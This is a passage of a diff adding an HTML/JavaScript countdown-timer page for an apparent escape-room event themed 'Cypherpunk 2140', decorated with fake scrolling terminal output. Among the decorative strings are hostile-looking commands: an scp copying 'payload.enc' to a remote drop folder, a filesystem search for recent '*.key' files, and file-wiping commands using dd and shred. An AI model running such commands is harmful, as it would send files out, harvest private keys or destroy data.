@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYPHERPUNK 2140 — COUNTDOWN</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700;800&family=Share+Tech+Mono&family=VT323&display=swap');
+
+        /* ── CONFIG ── */
+        :root {
+            --green: #00ff41;
+            --green-dim: #00cc33;
+            --green-dark: #003300;
+            --amber: #ffb000;
+            --red: #ff2020;
+            --red-dim: #cc1a1a;
+            --bg: #0a0a0a;
+            --bg-light: #111;
+            --scanline-alpha: 0.04;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: var(--bg);
+            color: var(--green);
+            font-family: 'JetBrains Mono', 'Share Tech Mono', monospace;
+            cursor: default;
+            user-select: none;
+        }
+
+        /* ── SCANLINES ── */
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg,
+                    transparent 0px,
+                    transparent 2px,
+                    rgba(0, 255, 65, var(--scanline-alpha)) 2px,
+                    rgba(0, 255, 65, var(--scanline-alpha)) 4px);
+            z-index: 9999;
+        }
+
+        /* ── CANVAS (background effects) ── */
+        #bgCanvas {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+        }
+
+        /* ── TERMINAL LOG (scrolling text) ── */
+        #terminalLog {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            overflow: hidden;
+            opacity: 0;
+            transition: opacity 1.5s ease;
+        }
+
+        #terminalLog.active {
+            opacity: 1;
+        }
+
+        .term-line {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            line-height: 1.5;
+            color: rgba(0, 255, 65, 0.12);
+            white-space: nowrap;
+            padding-left: 20px;
+            animation: termScroll 0.3s ease-out forwards;
+        }
+
+        @keyframes termScroll {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ── SCREENS ── */
+        .screen {
+            position: fixed;
+            inset: 0;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.8s ease;
+        }
+
+        .screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* ── READY SCREEN ── */
+        #readyScreen .title-block {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        #readyScreen .event-name {
+            font-family: 'VT323', monospace;
+            font-size: 28px;
+            color: var(--amber);
+            letter-spacing: 12px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            opacity: 0.7;
+        }
+
+        #readyScreen h1 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 120px;
+            font-weight: 800;
+            letter-spacing: -2px;
+            text-shadow:
+                0 0 20px rgba(0, 255, 65, 0.5),
+                0 0 60px rgba(0, 255, 65, 0.2),
+                0 0 120px rgba(0, 255, 65, 0.1);
+            animation: readyPulse 2.5s ease-in-out infinite;
+        }
+
+        @keyframes readyPulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                text-shadow: 0 0 20px rgba(0, 255, 65, 0.5), 0 0 60px rgba(0, 255, 65, 0.2);
+            }
+
+            50% {
+                opacity: 0.85;
+                text-shadow: 0 0 30px rgba(0, 255, 65, 0.7), 0 0 80px rgba(0, 255, 65, 0.3);
+            }
+        }
+
+        .play-btn {
+            position: relative;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: 8px;
+            color: var(--bg);
+            background: var(--green);
+            border: none;
+            padding: 24px 80px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        .play-btn:hover {
+            background: #33ff66;
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.4), 0 0 80px rgba(0, 255, 65, 0.15);
+        }
+
+        .play-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* ── COUNTDOWN SCREEN ── */
+        #countdownScreen {
+            background: transparent;
+        }
+
+        .timer-display {
+            text-align: center;
+            z-index: 20;
+            position: relative;
+        }
+
+        .timer-label {
+            font-family: 'VT323', monospace;
+            font-size: 22px;
+            letter-spacing: 10px;
+            color: var(--amber);
+            margin-bottom: 10px;
+            opacity: 0.6;
+        }
+
+        .timer-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 180px;
+            font-weight: 800;
+            line-height: 1;
+            letter-spacing: -4px;
+            color: var(--green);
+            text-shadow:
+                0 0 30px rgba(0, 255, 65, 0.5),
+                0 0 80px rgba(0, 255, 65, 0.2);
+            transition: color 1s ease, text-shadow 1s ease;
+        }
+
+        .timer-value.warning {
+            color: var(--red);
+            text-shadow:
+                0 0 30px rgba(255, 32, 32, 0.6),
+                0 0 80px rgba(255, 32, 32, 0.25);
+        }
+
+        .timer-value.critical {
+            color: var(--red);
+            text-shadow:
+                0 0 40px rgba(255, 32, 32, 0.8),
+                0 0 100px rgba(255, 32, 32, 0.3);
+            animation: criticalFlash 0.5s ease-in-out infinite;
+        }
+
+        @keyframes criticalFlash {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        .timer-tenths {
+            font-size: 80px;
+            letter-spacing: 0;
+            opacity: 0.8;
+        }
+
+        .timer-sub {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 16px;
+            letter-spacing: 6px;
+            color: var(--green-dim);
+            margin-top: 16px;
+            opacity: 0.4;
+            transition: color 1s ease;
+        }
+
+        .timer-sub.warning {
+            color: var(--red-dim);
+        }
+
+        /* ── TIME UP ── */
+        .time-up {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 160px;
+            font-weight: 800;
+            color: var(--red);
+            text-shadow:
+                0 0 40px rgba(255, 32, 32, 0.8),
+                0 0 100px rgba(255, 32, 32, 0.3);
+            animation: timeUpPulse 1s ease-in-out infinite;
+        }
+
+        @keyframes timeUpPulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        /* ── CONTROLS ── */
+        .controls {
+            position: fixed;
+            bottom: 20px;
+            right: 70px;
+            z-index: 100;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .ctrl-btn {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            color: var(--green-dim);
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            padding: 8px 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            outline: none;
+            opacity: 0.5;
+        }
+
+        .ctrl-btn:hover {
+            opacity: 1;
+            background: rgba(0, 255, 65, 0.1);
+            border-color: rgba(0, 255, 65, 0.3);
+        }
+
+        .ctrl-btn.paused {
+            color: var(--amber);
+            border-color: rgba(255, 176, 0, 0.3);
+            background: rgba(255, 176, 0, 0.08);
+        }
+
+        .controls.hidden {
+            display: none;
+        }
+
+        /* Fullscreen button — always visible */
+        .fs-wrap {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+
+        /* ── PAUSED OVERLAY ── */
+        .paused-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 50;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s ease;
+        }
+
+        .paused-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .paused-text {
+            font-family: 'VT323', monospace;
+            font-size: 72px;
+            letter-spacing: 16px;
+            color: var(--amber);
+            animation: pauseBlink 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pauseBlink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        /* ── FLOATING TERMINAL POPUPS ── */
+        .term-popup {
+            position: fixed;
+            z-index: 30;
+            width: 480px;
+            min-height: 120px;
+            max-height: 320px;
+            background: rgba(8, 8, 8, 0.92);
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            box-shadow:
+                0 0 20px rgba(0, 255, 65, 0.08),
+                inset 0 0 40px rgba(0, 0, 0, 0.5);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12.5px;
+            line-height: 1.6;
+            overflow: hidden;
+            pointer-events: none;
+            opacity: 0;
+            transform: scale(0.92) translateY(10px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        .term-popup.visible {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+        }
+
+        .term-popup.closing {
+            opacity: 0;
+            transform: scale(0.95) translateY(-5px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .term-popup .tp-titlebar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 5px 10px;
+            background: rgba(0, 255, 65, 0.06);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.12);
+        }
+
+        .term-popup .tp-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--green-dim);
+            opacity: 0.5;
+        }
+
+        .term-popup .tp-dot:first-child {
+            background: #ff5f57;
+        }
+
+        .term-popup .tp-dot:nth-child(2) {
+            background: #febc2e;
+        }
+
+        .term-popup .tp-dot:nth-child(3) {
+            background: #28c840;
+        }
+
+        .term-popup .tp-title {
+            flex: 1;
+            text-align: center;
+            font-size: 11px;
+            color: rgba(0, 255, 65, 0.4);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .term-popup .tp-body {
+            padding: 10px 12px;
+            overflow: hidden;
+            max-height: 270px;
+        }
+
+        .term-popup .tp-line {
+            color: var(--green);
+            white-space: nowrap;
+            overflow: hidden;
+            opacity: 0;
+            animation: tpLineIn 0.15s ease-out forwards;
+        }
+
+        @keyframes tpLineIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .term-popup .tp-line.cmd {
+            color: var(--green);
+        }
+
+        .term-popup .tp-line.cmd::before {
+            content: '$ ';
+            color: var(--amber);
+        }
+
+        .term-popup .tp-line.out {
+            color: rgba(0, 255, 65, 0.55);
+        }
+
+        .term-popup .tp-line.warn {
+            color: var(--amber);
+        }
+
+        .term-popup .tp-line.err {
+            color: var(--red);
+            opacity: 0.8;
+        }
+
+        .term-popup .tp-line.ok {
+            color: #28c840;
+        }
+
+        /* Progress bar for transfer type */
+        .tp-progress-wrap {
+            margin: 6px 0;
+            background: rgba(0, 255, 65, 0.08);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            height: 14px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tp-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--green-dark), var(--green-dim));
+            width: 0%;
+            transition: width 0.3s linear;
+        }
+
+        .tp-progress-text {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: var(--green);
+            letter-spacing: 1px;
+        }
+
+        /* Amber variant */
+        .term-popup.amber-border {
+            border-color: rgba(255, 176, 0, 0.2);
+            box-shadow: 0 0 20px rgba(255, 176, 0, 0.06), inset 0 0 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .term-popup.amber-border .tp-titlebar {
+            background: rgba(255, 176, 0, 0.04);
+            border-bottom-color: rgba(255, 176, 0, 0.1);
+        }
+
+        .term-popup.amber-border .tp-title {
+            color: rgba(255, 176, 0, 0.4);
+        }
+
+        /* Red variant */
+        .term-popup.red-border {
+            border-color: rgba(255, 32, 32, 0.2);
+            box-shadow: 0 0 20px rgba(255, 32, 32, 0.06), inset 0 0 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .term-popup.red-border .tp-titlebar {
+            background: rgba(255, 32, 32, 0.04);
+            border-bottom-color: rgba(255, 32, 32, 0.1);
+        }
+
+        .term-popup.red-border .tp-title {
+            color: rgba(255, 32, 32, 0.4);
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Background canvas for node network effect -->
+    <canvas id="bgCanvas"></canvas>
+
+    <!-- Terminal scrolling log -->
+    <div id="terminalLog"></div>
+
+    <!-- READY SCREEN -->
+    <div id="readyScreen" class="screen">
+        <div class="title-block">
+            <div class="event-name">Cypherpunk 2140</div>
+            <h1>R U READY?</h1>
+        </div>
+        <button class="play-btn" id="playBtn">▶ PLAY</button>
+    </div>
+
+    <!-- COUNTDOWN SCREEN -->
+    <div id="countdownScreen" class="screen hidden">
+        <div class="timer-display">
+            <div class="timer-label">TIME REMAINING</div>
+            <div class="timer-value" id="timerValue">45:00</div>
+            <div class="timer-sub" id="timerSub">ESCAPE WHILE YOU CAN</div>
+        </div>
+    </div>
+
+    <!-- PAUSED OVERLAY -->
+    <div class="paused-overlay" id="pausedOverlay">
+        <div class="paused-text">⏸ PAUSED</div>
+    </div>
+
+    <!-- FLOATING TERMINAL POPUPS -->
+    <div id="popupLayer"></div>
+
+    <!-- CONTROLS — pause only during countdown -->
+    <div class="controls hidden" id="controls">
+        <button class="ctrl-btn" id="pauseBtn" title="Pause / Resume">⏸</button>
+    </div>
+
+    <!-- FULLSCREEN — always visible -->
+    <div class="fs-wrap" id="fsWrap">
+        <button class="ctrl-btn" id="fsBtn" title="Fullscreen (F)">⛶</button>
+    </div>
+
+    <script>
+        // ═══════════════════════════════════════════════
+        //  CONFIG
+        // ═══════════════════════════════════════════════
+        const TOTAL_SECONDS = 45 * 60; // 45 minutes
+        const WARNING_THRESHOLD = 10 * 60; // 10 minutes — turns red
+        const CRITICAL_THRESHOLD = 60; // 60 seconds — flashing + tenths
+
+        // ═══════════════════════════════════════════════
+        //  STATE
+        // ═══════════════════════════════════════════════
+        let remaining = TOTAL_SECONDS;
+        let running = false;
+        let paused = false;
+        let lastTick = 0;
+        let remainingMs = TOTAL_SECONDS * 1000;
+
+        // ═══════════════════════════════════════════════
+        //  ELEMENTS
+        // ═══════════════════════════════════════════════
+        const readyScreen = document.getElementById('readyScreen');
+        const countdownScreen = document.getElementById('countdownScreen');
+        const timerValue = document.getElementById('timerValue');
+        const timerSub = document.getElementById('timerSub');
+        const controls = document.getElementById('controls');
+        const pauseBtn = document.getElementById('pauseBtn');
+        const fsBtn = document.getElementById('fsBtn');
+        const pausedOverlay = document.getElementById('pausedOverlay');
+        const terminalLog = document.getElementById('terminalLog');
+        const canvas = document.getElementById('bgCanvas');
+        const ctx = canvas.getContext('2d');
+
+        // ═══════════════════════════════════════════════
+        //  TERMINAL LOG — hacker scrolling text
+        // ═══════════════════════════════════════════════
+        const termLines = [
+            '> establishing encrypted tunnel...',
+            '[node-0x4F2A] handshake complete — latency 23ms',
+            'gpg: key 0xC1PH3R fingerprint verified',
+            '> scanning mempool for unconfirmed tx...',
+            '[WARN] peer 185.*.*.72 dropped — reconnecting',
+            '> sha256sum /dev/urandom | head -c 64',
+            'f7a3c91d0e4b28...OK',
+            '[tor] circuit established: 3 hops — exit node DE',
+            '> cat /proc/entropy_avail → 4096',
+            '[node-0x7B1C] block #888,041 propagated — 2 confirmations',
+            '> openssl enc -aes-256-cbc -salt -in seed.bin',
+            '[ALERT] unauthorized access attempt from 10.0.0.77',
+            '> iptables -A INPUT -s 10.0.0.77 -j DROP',
+            'Rule added. Threat neutralized.',
+            '[node-0x3E8D] syncing headers — 99.7%',
+            '> echo $RANDOM | sha256sum | base64 | head -c 32',
+            'nonce found: 00000000000000000003a7f2...',
+            '[consensus] valid block — difficulty: 7.93T',
+            '> scp -P 2222 payload.enc remote@onion.node:~/drop/',
+            'payload.enc                100%  4.2KB',
+            '[tor] new identity requested — circuits rebuilt',
+            '> grep -r "0xC1PH3R" /var/log/auth.log',
+            'No matches found. Ghost protocol active.',
+            '[node-0xA1F0] mempool: 48,291 pending transactions',
+            '> bitcoin-cli getblockchaininfo | jq .verificationprogress',
+            '0.999999812',
+            '[P2P] 14 peers connected — 8 inbound / 6 outbound',
+            '> find / -name "*.key" -mtime -1 2>/dev/null',
+            '/home/cipher/.gnupg/private-keys-v1.d/...',
+            '[WARN] disk encryption check — LUKS header intact',
+            '> dd if=/dev/zero of=/tmp/shred bs=1M count=256',
+            '256+0 records out — secure wipe complete',
+            '[node-0x9C2E] fee rate: 12 sat/vB — low priority',
+            '> gpg --armor --export 0xC1PH3R > pubkey.asc',
+            'public key exported: 4096R/0xC1PH3R',
+            '[signal] noise protocol ratchet advanced — key #4471',
+            '> python3 -c "import secrets; print(secrets.token_hex(32))"',
+            'a8f3...e21b',
+            '[ALERT] BGP anomaly detected — route hijack attempt',
+            '> traceroute -T -p 8333 seed.bitcoin.sipa.be',
+            '12 hops — no AS path manipulation detected',
+            '[node-0xD4B7] UTXO set: 178,432,019 entries',
+            '> tail -f /var/log/bitcoind.log | grep "UpdateTip"',
+            'UpdateTip: new best=00000000000000000002f1a...',
+            '[mixer] CoinJoin round #7 — 23 participants',
+            '> echo "trust the math, not the state" | sha256sum',
+            '3c9f...7a01  -',
+            '[heartbeat] all systems nominal — uptime 847d 13h',
+        ];
+
+        let termLineIndex = 0;
+        let termInterval = null;
+
+        function startTerminal() {
+            terminalLog.classList.add('active');
+            termInterval = setInterval(() => {
+                const line = document.createElement('div');
+                line.className = 'term-line';
+                line.textContent = termLines[termLineIndex % termLines.length];
+                terminalLog.appendChild(line);
+                termLineIndex++;
+                while (terminalLog.children.length > 55) {
+                    terminalLog.removeChild(terminalLog.firstChild);
+                }
+            }, 500 + Math.random() * 500);
+        }
+
+        function stopTerminal() {
+            if (termInterval) clearInterval(termInterval);
+        }
+
+        // ═══════════════════════════════════════════════
+        //  NETWORK NODES — canvas background
+        // ═══════════════════════════════════════════════
+        let nodes = [];
+        let animFrame;
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        function initNodes(count = 60) {
+            nodes = [];
+            for (let i = 0; i < count; i++) {
+                nodes.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    vx: (Math.random() - 0.5) * 0.4,
+                    vy: (Math.random() - 0.5) * 0.4,
+                    r: 1.5 + Math.random() * 2,
+                    pulse: Math.random() * Math.PI * 2,
+                });
+            }
+        }
+
+        function drawNodes() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            const maxDist = 200;
+            const now = Date.now() * 0.001;
+
+            // Draw connections
+            for (let i = 0; i < nodes.length; i++) {
+                for (let j = i + 1; j < nodes.length; j++) {
+                    const dx = nodes[i].x - nodes[j].x;
+                    const dy = nodes[i].y - nodes[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < maxDist) {
+                        const alpha = (1 - dist / maxDist) * 0.12;
+                        ctx.strokeStyle = `rgba(0, 255, 65, ${alpha})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.beginPath();
+                        ctx.moveTo(nodes[i].x, nodes[i].y);
+                        ctx.lineTo(nodes[j].x, nodes[j].y);
+                        ctx.stroke();
+                    }
+                }
+            }
+
+            // Draw + move nodes
+            for (const n of nodes) {
+                const glow = 0.3 + 0.2 * Math.sin(now * 1.5 + n.pulse);
+                ctx.fillStyle = `rgba(0, 255, 65, ${glow})`;
+                ctx.beginPath();
+                ctx.arc(n.x, n.y, n.r, 0, Math.PI * 2);
+                ctx.fill();
+
+                n.x += n.vx;
+                n.y += n.vy;
+
+                if (n.x < 0 || n.x > canvas.width) n.vx *= -1;
+                if (n.y < 0 || n.y > canvas.height) n.vy *= -1;
+            }
+
+            animFrame = requestAnimationFrame(drawNodes);
+        }
+
+        // Start background animation immediately (subtle on ready screen)
+        initNodes(50);
+        drawNodes();
+
+        // ═══════════════════════════════════════════════
+        //  TIMER LOGIC
+        // ═══════════════════════════════════════════════
+        function formatTime(ms) {
+            const totalSec = Math.max(0, ms / 1000);
+            const min = Math.floor(totalSec / 60);
+            const sec = Math.floor(totalSec % 60);
+            const tenths = Math.floor((totalSec * 10) % 10);
+            const isCritical = totalSec <= CRITICAL_THRESHOLD && totalSec > 0;
+
+            let str = String(min).padStart(2, '0') + ':' + String(sec).padStart(2, '0');
+            if (isCritical) {
+                str += '.' + tenths;
+            }
+            return str;
+        }
+
+        function updateDisplay() {
+            const totalSec = remainingMs / 1000;
+            timerValue.textContent = formatTime(remainingMs);
+
+            // State classes
+            timerValue.classList.remove('warning', 'critical');
+            timerSub.classList.remove('warning');
+
+            if (totalSec <= 0) {
+                timerValue.textContent = 'TIME UP';
+                timerValue.classList.add('critical');
+                timerSub.textContent = 'GAME OVER';
+                timerSub.classList.add('warning');
+                return;
+            }
+
+            if (totalSec <= CRITICAL_THRESHOLD) {
+                timerValue.classList.add('critical');
+                timerSub.classList.add('warning');
+                timerSub.textContent = '⚠ FINAL COUNTDOWN ⚠';
+            } else if (totalSec <= WARNING_THRESHOLD) {
+                timerValue.classList.add('warning');
+                timerSub.classList.add('warning');
+                timerSub.textContent = '⚠ TIME IS RUNNING OUT ⚠';
+            }
+        }
+
+        function tick(timestamp) {
+            if (!running || paused) {
+                lastTick = timestamp;
+                requestAnimationFrame(tick);
+                return;
+            }
+
+            if (!lastTick) lastTick = timestamp;
+            const delta = timestamp - lastTick;
+            lastTick = timestamp;
+
+            remainingMs = Math.max(0, remainingMs - delta);
+            updateDisplay();
+
+            if (remainingMs <= 0) {
+                running = false;
+                stopTerminal();
+                stopPopups();
+                return;
+            }
+
+            requestAnimationFrame(tick);
+        }
+
+        // ═══════════════════════════════════════════════
+        //  START
+        // ═══════════════════════════════════════════════
+        function startCountdown() {
+            readyScreen.classList.add('hidden');
+            countdownScreen.classList.remove('hidden');
+            controls.classList.remove('hidden');
+
+            // More nodes when running
+            cancelAnimationFrame(animFrame);
+            initNodes(80);
+            drawNodes();
+
+            // Start terminal
+            startTerminal();
+
+            // Start floating popups
+            startPopups();
+
+            // Start timer
+            remainingMs = TOTAL_SECONDS * 1000;
+            running = true;
+            paused = false;
+            lastTick = 0;
+            updateDisplay();
+            requestAnimationFrame(tick);
+        }
+
+        document.getElementById('playBtn').addEventListener('click', startCountdown);
+
+        // ═══════════════════════════════════════════════
+        //  PAUSE / RESUME
+        // ═══════════════════════════════════════════════
+        function togglePause() {
+            if (!running) return;
+            paused = !paused;
+            pauseBtn.textContent = paused ? '▶' : '⏸';
+            pauseBtn.classList.toggle('paused', paused);
+            pausedOverlay.classList.toggle('active', paused);
+        }
+
+        pauseBtn.addEventListener('click', togglePause);
+
+        // ═══════════════════════════════════════════════
+        //  FULLSCREEN
+        // ═══════════════════════════════════════════════
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => { });
+            } else {
+                document.exitFullscreen().catch(() => { });
+            }
+        }
+
+        fsBtn.addEventListener('click', toggleFullscreen);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'f' || e.key === 'F') {
+                toggleFullscreen();
+            }
+            if (e.key === ' ' && running) {
+                e.preventDefault();
+                togglePause();
+            }
+        });
+        // ═══════════════════════════════════════════════
+        //  FLOATING TERMINAL POPUPS
+        // ═══════════════════════════════════════════════
+        const popupLayer = document.getElementById('popupLayer');
+        let activePopups = 0;
+        let popupScheduler = null;
+
+        // ── Helpers ──
+        function rnd(a, b) { return a + Math.random() * (b - a); }
+        function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+        function hexChunk(n) { let s = ''; for (let i = 0; i < n; i++) s += '0123456789abcdef'[Math.floor(Math.random() * 16)]; return s; }
+        function rndIP() { return `${Math.floor(rnd(10, 220))}.${Math.floor(rnd(0, 255))}.${Math.floor(rnd(0, 255))}.${Math.floor(rnd(1, 254))}`; }
+
+        function createPopupEl(title, variant) {
+            const el = document.createElement('div');
+            el.className = 'term-popup' + (variant ? ' ' + variant : '');
+
+            // Position: avoid center 30% where timer is
+            let x, y;
+            const margin = 30;
+            const w = 480;
+            const h = 280;
+            const maxX = window.innerWidth - w - margin;
+            const maxY = window.innerHeight - h - margin;
+            const centerXMin = window.innerWidth * 0.25;
+            const centerXMax = window.innerWidth * 0.75 - w;
+            const centerYMin = window.innerHeight * 0.2;
+            const centerYMax = window.innerHeight * 0.8 - h;
+
+            // Try to place outside center zone, but accept after 10 attempts
+            for (let attempt = 0; attempt < 12; attempt++) {
+                x = rnd(margin, maxX);
+                y = rnd(margin, maxY);
+                if (attempt > 9) break;
+                if (x < centerXMin || x > centerXMax || y < centerYMin || y > centerYMax) break;
+            }
+
+            el.style.left = x + 'px';
+            el.style.top = y + 'px';
+
+            el.innerHTML = `
+    <div class="tp-titlebar">
+      <div class="tp-dot"></div><div class="tp-dot"></div><div class="tp-dot"></div>
+      <div class="tp-title">${title}</div>
+    </div>
+    <div class="tp-body"></div>
+  `;
+            return el;
+        }
+
+        function addLine(body, text, cls, delay) {
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    const line = document.createElement('div');
+                    line.className = 'tp-line' + (cls ? ' ' + cls : '');
+                    line.textContent = text;
+                    body.appendChild(line);
+                    // Keep body scrolled to bottom visually
+                    if (body.children.length > 14) {
+                        body.removeChild(body.firstChild);
+                    }
+                    resolve();
+                }, delay);
+            });
+        }
+
+        function closePopup(el) {
+            el.classList.remove('visible');
+            el.classList.add('closing');
+            setTimeout(() => {
+                el.remove();
+                activePopups = Math.max(0, activePopups - 1);
+            }, 600);
+        }
+
+        // ═══════════════════════════════════════════════
+        //  TYPE A: Command Execution
+        // ═══════════════════════════════════════════════
+        const cmdScenarioFactories = [
+            () => ({
+                title: 'bash — ssh tunnel',
+                steps: [
+                    { t: 'cmd', s: `ssh -D 9050 -C -N ghost@${rndIP()}` },
+                    { t: 'out', s: 'Authenticating with public key "0xC1PH3R_ed25519"' },
+                    { t: 'out', s: 'SOCKS proxy listening on 127.0.0.1:9050' },
+                    { t: 'cmd', s: 'curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip' },
+                    { t: 'out', s: `{"IsTor": true, "IP": "${rndIP()}"}` },
+                    { t: 'ok', s: 'Tunnel active. Identity masked.' },
+                ]
+            }),
+            () => ({
+                title: 'gpg — decrypt',
+                steps: [
+                    { t: 'cmd', s: `gpg --decrypt --armor payload_${hexChunk(2)}.asc` },
+                    { t: 'out', s: 'gpg: encrypted with 4096-bit RSA key, ID 0xC1PH3R' },
+                    { t: 'out', s: `gpg: using subkey 0x${hexChunk(8).toUpperCase()} for decryption` },
+                    { t: 'out', s: '-----BEGIN PGP MESSAGE-----' },
+                    { t: 'out', s: `hQIMA${hexChunk(16)}...` },
+                    { t: 'out', s: `=${hexChunk(4)}` },
+                    { t: 'out', s: '-----END PGP MESSAGE-----' },
+                    { t: 'ok', s: 'Decryption successful — 1 file extracted' },
+                ]
+            }),
+            () => ({
+                title: 'bash — memory wipe',
+                steps: [
+                    { t: 'cmd', s: `shred -vfz -n 5 /tmp/.cache_session_${hexChunk(4)}` },
+                    { t: 'out', s: `shred: /tmp/.cache_session_${hexChunk(4)}: pass 1/5 (random)...` },
+                    { t: 'out', s: `shred: pass 2/5 (${hexChunk(6)})...` },
+                    { t: 'out', s: 'shred: pass 3/5 (random)...' },
+                    { t: 'out', s: 'shred: pass 4/5 (random)...' },
+                    { t: 'out', s: 'shred: pass 5/5 (000000)...' },
+                    { t: 'ok', s: `${Math.floor(rnd(2, 7))} files securely wiped.` },
+                ]
+            }),
+            () => ({
+                title: 'python3 — keygen',
+                steps: [
+                    { t: 'cmd', s: 'python3 keygen.py --algo ed25519 --entropy /dev/hwrng' },
+                    { t: 'out', s: 'Collecting hardware entropy... 256 bits' },
+                    { t: 'out', s: `Private key: ${hexChunk(32)}...` },
+                    { t: 'out', s: `Public key:  ${hexChunk(32)}...` },
+                    { t: 'cmd', s: 'sha256sum keypair.bin' },
+                    { t: 'out', s: `${hexChunk(64)}  keypair.bin` },
+                    { t: 'ok', s: 'Key pair generated and verified.' },
+                ]
+            }),
+            () => ({
+                title: 'bitcoin-cli',
+                steps: [
+                    { t: 'cmd', s: 'bitcoin-cli getblockchaininfo' },
+                    { t: 'out', s: `"blocks": ${Math.floor(rnd(888000, 892000))},` },
+                    { t: 'out', s: `"headers": ${Math.floor(rnd(888000, 892000))},` },
+                    { t: 'out', s: '"bestblockhash": "000000000000000000' + hexChunk(22) + '",' },
+                    { t: 'out', s: `"difficulty": ${rnd(1.1, 1.3).toFixed(2)}e+14,` },
+                    { t: 'out', s: '"verificationprogress": 0.999999987,' },
+                    { t: 'ok', s: 'Node fully synced.' },
+                ]
+            }),
+            () => ({
+                title: 'tor — circuit rebuild',
+                steps: [
+                    { t: 'cmd', s: 'torctl signal NEWNYM' },
+                    { t: 'out', s: 'Signal accepted. Building new circuit...' },
+                    { t: 'out', s: `Guard:  ${rndIP()} [${hexChunk(8).toUpperCase()}]` },
+                    { t: 'out', s: `Middle: ${rndIP()} [${hexChunk(8).toUpperCase()}]` },
+                    { t: 'out', s: `Exit:   ${rndIP()} [${hexChunk(8).toUpperCase()}]` },
+                    { t: 'ok', s: 'New identity active. 3-hop circuit established.' },
+                ]
+            }),
+            () => ({
+                title: 'openssl — hash verify',
+                steps: [
+                    { t: 'cmd', s: `openssl dgst -sha256 seed_fragment_${hexChunk(2)}.bin` },
+                    { t: 'out', s: `SHA256(seed_fragment.bin)= ${hexChunk(64)}` },
